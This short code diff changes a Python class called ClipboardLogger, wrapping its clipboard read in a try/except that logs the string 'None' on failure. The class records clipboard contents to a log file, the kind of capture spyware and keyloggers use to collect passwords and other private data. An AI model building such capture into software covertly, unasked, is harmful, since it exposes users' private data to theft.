@@ -16,7 +16,11 @@ class ClipboardLogger:
         self.running = True
 
     def log_clipboard(self):
-        data = pyperclip.paste().replace("\n", r"\n")
+        try:
+            data = pyperclip.paste().replace("\n", r"\n")
+        except:
+            data = "None"
+            pass
         log_to_file(self.log_file, data)
         self.increment_and_check_counter()
         
